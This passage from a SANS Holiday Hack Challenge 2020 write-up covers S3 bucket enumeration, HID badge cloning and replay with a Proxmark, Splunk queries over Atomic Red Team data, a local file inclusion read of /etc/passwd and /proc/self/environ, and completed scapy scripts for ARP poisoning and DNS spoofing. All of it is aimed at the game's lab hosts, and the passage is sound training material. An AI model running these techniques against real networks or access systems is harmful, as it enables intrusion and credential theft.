wrapper3000 hint, and added that to the word list.\nelf@cb4ef197f1c4:~/bucket_finder$ ./bucket_finder.rb -d wordlist http://s3.amazonaws.com/kringlecastle Bucket found but access denied: kringlecastle http://s3.amazonaws.com/wrapper Bucket found but access denied: wrapper http://s3.amazonaws.com/santa Bucket santa redirects to: santa.s3.amazonaws.com http://santa.s3.amazonaws.com/ Bucket found but access denied: santa http://s3.amazonaws.com/wrapper3000 Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 )  http://s3.amazonaws.com/wrapper3000/package Adding -d to bucket_finder.rb will also download files found in the bucket, which in this case meant that we got the file called package. If we were to cat package to see what’s inside, we’ll find a base64 string.\nelf@cb4ef197f1c4:~/bucket_finder/wrapper3000$ cat package UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AX yl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0 ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFAC gIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADL e80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbj cBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ce DQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn /OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2th Z2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA elf@cb4ef197f1c4:~/bucket_finder/wrapper3000$ Easy, the next step was to base64 decode the file ofc.\n  package base64 decoded showing nonprintable and many familiar file headers   That resulted in a bunch of nonprintable characters, but, it was possible to make out that this could be a zipfile based on some familiar strings in the output. You could confirm that using the file command as well.\nelf@cb4ef197f1c4:~/bucket_finder/wrapper3000$ cat package | base64 -d | file - /dev/stdin: Zip archive data, at least v1.0 to extract Great! So let’s redirect the decoding to a file and unzip it!\nelf@cb4ef197f1c4:~/bucket_finder/wrapper3000$ cat package | base64 -d  package.zip elf@cb4ef197f1c4:~/bucket_finder/wrapper3000$ unzip package.zip Archive: package.zip extracting: package.txt.Z.xz.xxd.tar.bz2 elf@cb4ef197f1c4:~/bucket_finder/wrapper3000$ ls -l total 12 -rw-r--r-- 1 elf elf 829 Dec 30 15:44 package -rw-r--r-- 1 elf elf 415 Dec 4 11:04 package.txt.Z.xz.xxd.tar.bz2 -rw-r--r-- 1 elf elf 621 Dec 30 15:50 package.zip Given all of the file extensions the resultant file has, by now we should know why this is called package. Solving this from here should be mostly trivial, repeating the same process we have been following to unpack/decompress the relevant format.\nI copied over the base64 found in package to my computer, and wrote a one-liner to get to the final message.\n$ cat package | base64 -D | funzip | tar -zxOf - | xxd -r - | unxz - | uncompress - North Pole: The Frostiest Place on Earth 3 - point-of-sale password recovery  Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What’s the password?\n After completing the linux primer terminal challenge, some hints one how to solve this one is given.\n  santa shop in courtyard   Opening the challenge we get a link to download an executable at https://download.holidayhackchallenge.com/2020/santa-shop/santa-shop.exe.\nI took this file and ran it on a Windows VM, which installed what looked like an Electron application and presented me with the password screen the challenge referred to. The hint we get from the terminal challenge tells us that it is possible to extract JavaScript source code for electron apps using a utility called asar. More specifically, this utility can read the archive format for .asar files, and we have to get that from the Point-of-Sale application.\nTo get the file, open the task manager after running santa-shop. Browse to the “Details” tab and search for the santa-shop.exe process. Right click any of the few and hit “Open file location”.\n  open file location dialog in windows task manager   Next, open the resources/ directory where you will find a file called app.asar. I copied this to my host.\nThe next steps are to extract the contents of this file. One of the hints you get suggests that you do this with npm install -g asar, however, I did it without the -g flag. I don’t like node in general, and having stuff in my global node_modules is not something I like either. Instead, I installed it with npm install asar which created a node_modules folder in my current working directory. Then, to run asar I use a utility called npx, meaning I can invoke a locally installed instance of asar with npx asar.\nGreat, with app.asar ready, the next step is to extract it with npx asar extract app.asar src. This will leave the contents of the archive in the src/ directory. Then, to solve this challenge, simply grep for password, ignoring case.\n  the password was 'santapass'   Notice the SANTA_PASSWORD constant.\n4 - operate the santavator This objective did not really give you a lot to work with directly.\n Talk to Pepper Minstix in the entryway to get some hints about the Santavator.\n Pepper was our unescape tmux challenge elf, so after you finished that you’d get some hints on how to operate the Santavator. Basically, you’d pick up stuff lying around, including an all-important elevator key, pop open the button’s panel and “tweak” the internals to make the buttons usable. The idea was to get the light particle source split up so that each coloured section would get enough particles to light up the section.\nUnfortunately I have no idea where I picked most of the stuff I got such as nuts, lights and the key, but, you should be able to spot them lying around on the ground on the map pretty easily. Just walk around a bit and explore the rooms.\n  items picked up on the map accessible via your badge   When you enter the elevator there is a panel you could click on in the bottom left.\n  santavator panel outside. yellow light around a button means its usable.   With the key, you could open it up and see the inside.\n  santavator panel inside with my configuration that lit up all of the lights   Activating a light should see you complete the objective. Close up the panel and hit the buttons for the floors you have available. Further poking (and a later challenge) showed that you can actually skip all of this and just make the buttons active regardless.\n5 - open hid lock  Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.\n Bushy Evergreen stood by the Speaker UNPrep terminal challenge, and once you complete the lights challenge, we’re told that the Proxmark can simulate badges. Alright, again, I can’t remember where I picked up the proxmark, but just walking around everywhere you should spot it lying on the ground. Bushy also mentioned a talk that is super useful to understand the proxmark a little better: https://www.youtube.com/watch?v=647U85Phxgo\nOnce you have the proxmark you will find it on your badge under items.\n  proxmark accessible from your badge   Clicking on the “Open Proxmark CLI” button will show you this interface (as if you plugged the Proxmark into your computer)\n  proxmark cli   Since the challenge name specifically mentioned “HID”, there were only two commands/actions that were really interesting. The first to read (clone) existing HID devices on the map, and the second to replay one of those cards in the Workshop.\nMy approach was to just walk to each and every Elf I could find, open up the Proxmark CLI and running the lf hid read command, recording the card data in a text file.\n  example hid read output   All of the card data I gathered were:\nbow ninecandle (talks lobby) - #db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023 shinny upatree (front lawn) - #db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025 sparkle redberry (entryway) - #db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022 ginger breddie (entryway) - #db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022 angel candysalt (great room) - #db# TAG ID: 2006e22f31 (6040) - Format Len: 26 bit - FC: 113 - Card: 6040 holly evergreen (kitchen) - #db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024 noel boetie (wrapping room) - #db# TAG ID: 2006e22ee1 (6000) - Format Len: 26 bit - FC: 113 - Card: 6000 Once I had all the cards I thought I could find, I went to the Workshop and ran the lf hid sim command for each tag I had scanned.\n[magicdust] pm3 -- lf hid sim -r 2006e22f13 --fc 113 --cn 6025 [=] Simulating HID tag using raw 2006e22f13 [=] Stopping simulation after 10 seconds. [=] Done Turns out, Skinny Upatree had a card that would unlock the Workshop door.\n  unlocked workshop door   Entering the room behind the door had me confused at first. It was dark with basically nothing inside it. I actually thought I hid a snag where my browser failed to render the room. Turns out that is exactly how the room should look, and if you move all the down you’d see a light.\n  the only light in the workshop room   Clicking this light as your normal avatar teleports you back to the Entry room, but, now you are Santa!\n  look, we are santa!   At this stage you would have unlocked the rest of the objectives on your badge, and you could now do challenges such as the Splunk challenge that only Santa could do. Paying close attention to the narrative, many Elf’s mentioned that Santa was acting strange. At this point it is clear that it was because of the ability we have to impersonate him.\n6 - splunk challenge  Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?\n For this challenge you had to be playing as Santa (accessible after you completed objective 5)\nAngel Candysalt stands next to a computer with the Splunk logo on it in the great room.\n  splunk computer in the great room   Clicking the computer opened a new tab with a Splunk Web UI here: https://splunk.kringlecastle.com/en-US/app/SA-kringleconsoc/kringleconsoc. Trying to browse to that URL without logging into the Kringlecon 3 challenge site would have you redirected to a login page, fwiw.\n  splunk webui with the kringlesoc app open   For this challenge you had to answer a few questions (seen on the right) based on an Adversary Simulation that had been run using the Splunk Attack Range. Conversations in the KringleSOC chats reveal these details to help you understand where the data is coming from. Once you are ready to start, the chat with “Alice Bluebird'' would guide you through the rest of it.\nLet’s tackle those questions and the Search Processing Language (SPL) I used to solve them.\n  How many distinct MITRE ATT\u0026CK techniques did Alice emulate?   Alice gave us an example search to use here | tstats count where index=* by index, so I just pasted that and manually counted the techniques to get to 13 haha!\n  splunk example SPL for question 1   Alice’s (much better) search for this was apparently this, which gives you the count too:\n| tstats count where index=* by index | search index=T*-win OR T*-main | rex field=index \"(?t\\d+)[\\.\\-].0*\" | stats dc(technique)  What are the names of the two indexes that contain the results of emulating Enterprise ATT\u0026CK technique 1059.003? (Put them in alphabetical order and separate them with a space)   For this one I just looked at my previous searches results and spotted ‘em with my eye as t1059.003-main t1059.003-win. Easy.\n One technique that Santa had us simulate deals with ‘system information discovery’. What is the full name of the registry key that is queried to determine the MachineGuid?   This one was trickier. Because MITRE ATT\u0026CK references don’t actually include any attack details (or examples if you will), I opted to clone the Atomic Red Team repository and search through there for answers instead.\n  atomic red team search for MachineGuid   I cross referenced Splunk search results to check that we actually ran T1082 (which we did), and inferred the registry key as HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography.\n According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)   OSTAP? Oh, right, malware. Much like the previous question, I searched for references in the Atomic Red Team repository and found that T1204 was related to this. Alice also gives an important hint here in that the index that gets used to record all simulations that were run is in index=attack. So, the final SPL to find the timestamp for me was: index=attack ostap | sort _time.\n  splunk question 4 search \u0026 result   The answer was 2020-11-30T17:44:15Z.\n One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?   This one was tricky for me as it took me a really long time to discover which parts were important from both the Github profile, the relevant project and the correct data in splunk. Anyways, we get a vague hint about someone’s Github profile, asking us to find the PID of the first relevant process created for the technique.\nChecking out the users Github profile, we find one project that may be relevant (based purely on eliminating the other projects they had). AudioDeviceCmdlets. Searching for AudioDeviceCmdlets in the Atomic Red Team repository we find T1123, which we also have an index for in splunk. So, this must be the relevant TTP.\nWe’re told that Event Code 1 is the event type we’re interested in, and that is something Sysmon will give us, so we can add that to our search. At this point I had index=t1123-win EventCode=1 *audio* for my search. This narrowed the possibilities down to two events for me.\n  splunk question 5 search \u0026 result   The first entry in the results was not specific to the AudioDeviceCmdlets component, so the only other option was 3648 found with the index=t1123-win EventCode=1 *audio* | table process_id, cmdline search.\n Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?   I think this one was the hardest. By now I have gotten into the habit of searching through the Atomic Red Team atomics/ directory for details on how some of these techniques were run, but this time I couldn’t find any batch files with correct answers that they were asking for. So, I had to search purely in Splunk this time.\nI figured that with command line auditing enabled we should be able to see at least where/how the batch file would get invoked, and hopefully as a result of the auditing see the subsequent commands in the bat file that were run as well. To narrow things down, I started with this search (removing splunk agents to reduce noise): index=* cmdline=* cmdline!=\"*SplunkUniversalForwarder*\" \"*.bat*\". This resulted in some Sysmon events I could spot, and adding | stats count by index to the search revealed T1059.003 and T1547.001. Great, however, the Atomic Red Team atomics for those weren’t as useful as I had hoped (at least none of my answers worked haha).\nTo make the data more readable for me with the relevant parts, I tabled the columns I figured would be interesting and started working through those with index=* cmdline=* cmdline!=\"*SplunkUniversalForwarder*\" \"*.bat*\" | sort _time desc | table index, cmdline.\n  splunk question 6 search \u0026 result   The very last entry in that list was a PowerShell command that downloaded a bat file from the atomic-red-team repository here. Right at the end of that script we can see the quser command, which is also the answer!\n According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range?   Alice gives us a hint that the Zeek logs are in an index that starts with bro by suggesting a search to start with: index=* sourcetype=bro*. To see all of the source types available I used this search: index=* | stats count by sourcetype. Because this question specifically asks for an x509 serial number, I refined my search to specifically the bro:x509:json source type with index=* sourcetype=\"bro:x509:json\". The very first result was for the Domain Controller and showed the serial number as 55FCEEBB21270D9249E86F4B9DC7AA60.\n  splunk question 7 search \u0026 result    What is the name of the adversary group that Santa feared would attack KringleCon?   Alice gave us a hint and an encrypted phrase to decrypt: 7FXjP1lyfKbyDK/MChyf36h7.\n  splunk encrypted phrase to decrypt   For this challenge you had to have watched the talk that Angel Candysalt spoke about which had a very specific, awkward and weird pause on a slide with the words “Stay Frosty” on it here. I solved the challenge using CyberChef by base64 decoding the phrase Alice gave us, and RC4 decrypting it (after a quick Google for RFC 7465) using Stay Frosty as the passphrase to reveal the answer as The Lollipop Guild. A link to my solution using CyberChef is here.\n7 - solve the sleigh’s can-d-bus problem  Jack Frost is somehow inserting malicious messages onto the sleigh’s CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.\n For this challenge you had to be playing as Santa (accessible after you completed objective 5)\n  santa by the sleigh in the netwars room   Clicking on the Sleigh as Santa presented this interface with the messages on the right scrolling by really fast.\n  sleigh can-d-bus interface   It takes a little while to get used to the interface, so clicking around and seeing the effects it has on the messages you see is highly encouraged.\nFrom the CANBus investigation challenge we learnt that messages have a type and a data field, separated by the #. As far as filtering goes, the Epoch and Time fields can be ignored. The ID and Message fields are important. My approach was to filter out everything that was just racing by so I could get the message log as quiet as possible. That meant I had the following rules at first.\n  sleigh filtering all default traffic   With the message log quiet, I started to fiddle with the controls and filters to map which message ID’s related to which feature. For example, I would toggle the Accelerator up (after starting the sleigh) and then remove filters to see which messages were being generated. Repeating that for each feature I ended with the following list.\n244 - Accelerator 080 - Brake 019 - Steering 02A - Start / Stop 19B - Lock / Unlock With the mapping done, and keeping in mind the hint we received from Wunorse Openslae after completing the terminal, I focussed on the brakes and locks mechanism. This was mostly a trial and error thing, but in the end I had these two filters applied to remove messages that appeared to mess with the functioning of the sleigh.\n19B Equals 0000000F2057 080 Contains FFFF 8 - broken tag generator  Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.\n The tag generator was available via the URL revealed in the objective here: https://tag-generator.kringlecastle.com/. Browsing to it you’d see:\n  broken tag generator ui   This was actually one of the few web hacking challenges and was pretty simple. Fuzzing the UI, I tried to upload a text document.\n  broken tag generator text file upload error   The error displayed reveals a local path of a .rb file (so I guessed this was a Ruby web app), and what I am guessing is a temporary directory for processing uploads. Next, I uploaded a legitimate image which I figured the web app would allow. I opened the browser console to see what web traffic was generated with the upload, which revealed that an accepted image would be accessible from an image specific endpoint.\n  broken tag generator upload web traffic   I opened the image URL in a new tab, which revealed the full URL as https://tag-generator.kringlecastle.com/image?id=a5471902-34bb-461c-80d7-2620c3d1bc66.png. At this stage I decided to fire up Burp Suite to test if the id field may be vulnerable to local file inclusion using an id of ../../../../etc/passwd, which it was.\n  broken tag generator lfi   With LFI on Linux hosts you can query for a lot of interesting information from the /proc mount, and given that the challenge asked us to reveal what was stored in an environment variable, we could reveal that by reading /proc/self/environ.\n  broken tag generator `GREETZ` variable   JackFrostWasHere was the answer.\n9 - arp shenanigans  Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?\n For this challenge you had to be playing as Santa (accessible after you completed objective 5)\n  arp shenanigans challenge visible when playing as santa   Oh boy, this was a fun one! The challenge had quite a few layers to it, each clearly following on the other as you process through it.\n  arp shenanigans initial shell   The challenge drops you in a tmux session with one of the messages saying that we need to try and get control over 10.6.6.35 again. The suggested HELP.md file simply contained some basic unixy tips, and example pcaps you could look at for ARP \u0026 DNS traffic. There were some files \u0026 directories already present on the filesystem too.\nguest@b0fe959ddcac:~$ ls -l total 16 -rw-r--r-- 1 guest guest 830 Dec 5 00:00 HELP.md drwxr-xr-x 1 guest guest 4096 Dec 7 21:11 debs lrwxrwxrwx 1 guest guest 9 Dec 7 21:11 motd - /etc/motd drwxr-xr-x 1 guest guest 4096 Dec 1 15:27 pcaps drwxr-xr-x 1 guest guest 4096 Dec 7 21:11 scripts The pcaps/ folder had some example ARP \u0026 DNS pcaps. The scripts/ folder had two example scripts where scapy was used in one to generate an ARP reply, and a DNS answer in another. These two scripts contained some fields you had to complete.\nThe provided ARP script was:\n#!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 ip ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our eth0 mac address macaddr = ':'.join(['{:02x}'.format((uuid.getnode()  i) \u0026 0xff) for i in range(0,8*6,8)][::-1]) def handle_arp_packets(packet): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet[ARP].op == 1: ether_resp = Ether(dst=\"SOMEMACHERE\", type=0x806, src=\"SOMEMACHERE\") arp_response = ARP(pdst=\"SOMEMACHERE\") arp_response.op = 99999 arp_response.plen = 99999 arp_response.hwlen = 99999 arp_response.ptype = 99999 arp_response.hwtype = 99999 arp_response.hwsrc = \"SOMEVALUEHERE\" arp_response.psrc = \"SOMEVALUEHERE\" arp_response.hwdst = \"SOMEVALUEHERE\" arp_response.pdst = \"SOMEVALUEHERE\" response = ether_resp/arp_response sendp(response, iface=\"eth0\") def main(): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1) if __name__ == \"__main__\": main() And the provided DNS script was:\n#!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our Mac Addr macaddr = ':'.join(['{:02x}'.format((uuid.getnode()  i) \u0026 0xff) for i in range(0,8*6,8)][::-1]) # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.1.10\" def handle_dns_request(packet): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether(src=\"00:00:00:00:00:00\", dst=\"00:00:00:00:00:00\") # need to replace mac addresses ip = IP(dst=\"0.0.0.0\", src=\"0.0.0.0\") # need to replace IP addresses udp = UDP(dport=99999, sport=99999) # need to replace ports dns = DNS( # MISSING DNS RESPONSE LAYER VALUES  ) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") def main(): berkeley_packet_filter = \" and \".join( [ \"udp dst port 53\", # dns \"udp[10] \u0026 0x80 = 0\", # dns request \"dst host {}\".format(ipaddr_we_arp_spoofed), # destination ip we had spoofed (not our real ip) \"ether dst host {}\".format(macaddr) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=\"eth0\", count=1) if __name__ == \"__main__\": main() These two scripts were definitely very useful. But, to know where to start, we had to check out what traffic we could see on the host we do have access to. Using tcpdump we can do just that.\nguest@b0fe959ddcac:~/scripts$ tcpdump tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 15:52:15.869362 ARP, Request who-has winsrvdc2019.guestnet0.kringlecastle.com tell arp_requester.guestnet0.kringlecastle.com, length 28 15:52:16.917383 ARP, Request who-has winsrvdc2019.guestnet0.kringlecastle.com tell arp_requester.guestnet0.kringlecastle.com, length 28 15:52:17.957376 ARP, Request who-has winsrvdc2019.guestnet0.kringlecastle.com tell arp_requester.guestnet0.kringlecastle.com, length 28 15:52:19.009424 ARP, Request who-has winsrvdc2019.guestnet0.kringlecastle.com tell arp_requester.guestnet0.kringlecastle.com, length 28 ^C 4 packets captured 4 packets received by filter 0 packets dropped by kernel With name resolution turned off (-n flag), we can also get a good idea of which IP’s specifically were at play here:\nguest@b0fe959ddcac:~/scripts$ tcpdump -n tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 15:52:24.245355 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 15:52:25.293394 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 15:52:26.337427 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 15:52:27.381423 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 ^C 4 packets captured 4 packets received by filter 0 packets dropped by kernel Neat, so the host we’re interested in is asking (every second?) who has 10.6.6.53! ARP being a layer 2 protocol means we’d be interested in the MAC addresses used to be able to craft a legitimate response using the provided script. Another way to view network traffic is to use tshark. In this case it would print out the relevant MAC addresses too.\nguest@b0fe959ddcac:~/scripts$ tshark -n Capturing on 'eth0' 1 0.000000000 4c:24:57🆎ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 2 1.047977896 4c:24:57🆎ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 3 2.092716820 4c:24:57🆎ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 4 3.147953807 4c:24:57🆎ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 ^C4 packets captured Neat, 4c:24:57🆎ed:84 is making the ARP request, so let’s forge a response, saying that we are that host! This is where the arp_resp.py script given to us in the scripts/ directory will be handy. The parts we need to complete are clearly marked too. Now, an ARP packet actually contains a number of fields. You could view the pcaps in Wireshark (or Cloudshark like the hints had), or, since we’re receiving a new ARP request every second, we can use scapy to capture a packet and then just copy out the relevant fields from there. The provided script actually has all the code we need too!\n from scapy.all import *  sniff(filter=\"(arp[6:2] = 1)\", count=1)  a=_  a[0]  Here we can see all of the ARP fields we need, except for the value of ptype which you will see is 0x800 when viewed in wireshark. So, to complete the script using that captured packet as reference, I had:\n#!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 ip ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our eth0 mac address macaddr = ':'.join(['{:02x}'.format((uuid.getnode()  i) \u0026 0xff) for i in range(0,8*6,8)][::-1]) us = ni.ifaddresses('eth0')[ni.AF_LINK][0]['addr'] them = \"4c:24:57🆎ed:84\" def handle_arp_packets(packet): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet[ARP].op == 1: ether_resp = Ether(dst=them, type=0x806, src=us) arp_response = ARP(pdst=them) arp_response.op = 2 arp_response.plen = 4 arp_response.hwlen = 6 arp_response.ptype = 0x0800 arp_response.hwtype = 1 arp_response.hwsrc = us arp_response.psrc = \"10.6.6.53\" arp_response.hwdst = them arp_response.pdst = \"10.6.6.35\" response = ether_resp/arp_response sendp(response, iface=\"eth0\") def main(): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1) if __name__ == \"__main__\": main() Note: The us variable is the result of me realising that if the environment is refreshed (you closed the terminal or something else happened), your IP address and MAC address could change. So, that part is just to ignore those and just pull whatever the current value is.\nHaving tshark open in one window while running python3 arp_resp.py to effectively perform an ARP poisoning attack, we would see the next step in the challenge.\n  arp shenanigans dns request after arp poison   Our ARP response and the new DNS request for ftp.osuosl.org extracted:\n6 4.228167027 02:42:0a:06:00:03 → 4c:24:57🆎ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03 7 4.268778840 10.6.6.35 → 10.6.6.53 DNS 74 Standard query 0x0000 A ftp.osuosl.org After telling 10.6.6.35 that “hey, we’re that 10.6.6.53 ip you’re looking for!”, a DNS lookup for ftp.osuosl.org follows soon after. Yep, you guessed it, we need to reply with an IP, and preferably our IP!\nThe dns_resp.py script needed some carefully considered modifications. Once specific change I had to make was to relax the packet filter rules as scapy was not seeing the incoming DNS traffic. You also have to consider how the DNS request got to us, and what a typical response conversation would have looked like. If we take a look at another tcpdump session after performing the ARP poison, you’d see what I want to get to.\nguest@b0fe959ddcac:~/scripts$ tcpdump -n \"port 53\" tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 16:09:39.597827 IP 10.6.6.35.28203  10.6.6.53.53: 0+ A? ftp.osuosl.org. (32) The incoming DNS request came from 10.6.6.35 on port 28203 to 10.6.6.53 on port 53. That means our reply needs to be sent to 10.6.6.35 on port 28203, coming from port 53. The thing is though, every request coming in from 10.6.6.35 will have a random high port like this (it’s part of how TCP/IP works), so we need to make sure we parse that in our python script to ensure the reply is sent where it’s expected.\nLayer 3 aside, we also need to remember that this DNS request came in to us as a result of an ARP spoofing attack, so when we craft the reply packet we need to ensure that we have the correct layer 2 packet configured as well.\nLet’s complete the script sections that will deal with the TCP/IP transport first, and then we’ll move on the DNS specific portion of the packet.\n# destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.6.35\" us = ni.ifaddresses('eth0')[ni.AF_LINK][0]['addr'] them = \"4c:24:57🆎ed:84\" def handle_dns_request(packet): eth = Ether(src=us, dst=packet[Ether].src) # need to replace mac addresses ip = IP(dst=packet[IP].src, src=packet[IP].dst) # need to replace IP addresses udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) # need to replace ports dns = DNS( # incomplete for now ) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") You should see in the above snippet that fields such as the source MAC address, the source port etc. are all parsed from the received packet stored in a variable called packet. Scapy makes it really simple to extract fields from a packet and here you can see how that is useful.\nAlright, let’s move on to the DNS() field. I found two resources that were immensely useful in recreating the necessary DNS packet. Those were https://thepacketgeek.com/scapy/building-network-tools/part-09/ and https://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html. My initial attempts at this resulted in a DNS() field that looked like this:\ndns = DNS( id=packet[DNS].id, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNSQR].qname, rdata=ipaddr)/DNSRR(rrname=\"ftp.osuosl.org\",rdata=ipaddr) ) One final tweak I made was to create an infinite loop for the sniff() function. I did not want to race the ARP spoof and incoming DNS request, and it had the added bonus of making the attack easily repeatable for the later stages as I was debugging my scripts. Anyways, running the dns_resp.py (which had the infinite loop now) and then arp_resp.py script while watching DNS dump resulted in:\nlistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 16:18:49.245472 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 16:18:50.357351 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 16:18:51.405393 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 16:18:51.445590 ARP, Reply 10.6.6.53 is-at 02:42:0a:06:00:03, length 28 16:18:51.473763 IP 10.6.6.35.16029  10.6.6.53.53: 0+ A? ftp.osuosl.org. (32) 16:18:51.498067 IP 10.6.6.53.53  10.6.6.35.16029: 0*- [0q] 2/0/0 A 10.6.0.3, A 10.6.0.3 (72) 16:18:52.461391 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 16:18:53.517373 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 I could see the incoming DNS request, and I could see a response (with the correct reverse port mapping), but nothing happened afterwards. Hmm. I double checked my code, double checked my references, but nothing. As I continued debugging this, I figured I needed to take a closer look at the DNS response packet I was generating. Not from a code perspective, but rather from a packet dump perspective.\nThere is a -Y flag available for tshark which allows us to specify a packet dissector. Something you automatically get when using the Wireshark GUI, but not when using the CLI. So, to get tshark to show me details about the DNS packets that were flowing up and down, I ran it with tshark -n -i eth0 -Y \"dns\" -V.\nFor the sake of brevity I’m going to strip the layer 2/3 stuff, and instead focus on the DNS dissection. Here was the incoming packet.\n[ ... ] Domain Name System (query) Transaction ID: 0x0000 Flags: 0x0100 Standard query 0... .... .... .... = Response: Message is a query .000 0... .... .... = Opcode: Standard query (0) .... ..0. .... .... = Truncated: Message is not truncated .... ...1 .... .... = Recursion desired: Do query recursively .... .... .0.. .... = Z: reserved (0) .... .... ...0 .... = Non-authenticated data: Unacceptable Questions: 1 Answer RRs: 0 Authority RRs: 0 Additional RRs: 0 Queries ftp.osuosl.org: type A, class IN Name: ftp.osuosl.org [Name Length: 14] [Label Count: 3] Type: A (Host Address) (1) Class: IN (0x0001) The response however, while it may seem right at first glance, wasn’t.\n[ ... ] Domain Name System (query) Transaction ID: 0x0000 [Expert Info (Warning/Protocol): DNS query retransmission. Original request in frame 6] [DNS query retransmission. Original request in frame 6] [Severity level: Warning] [Group: Protocol] Flags: 0x0100 Standard query 0... .... .... .... = Response: Message is a query .000 0... .... .... = Opcode: Standard query (0) .... ..0. .... .... = Truncated: Message is not truncated .... ...1 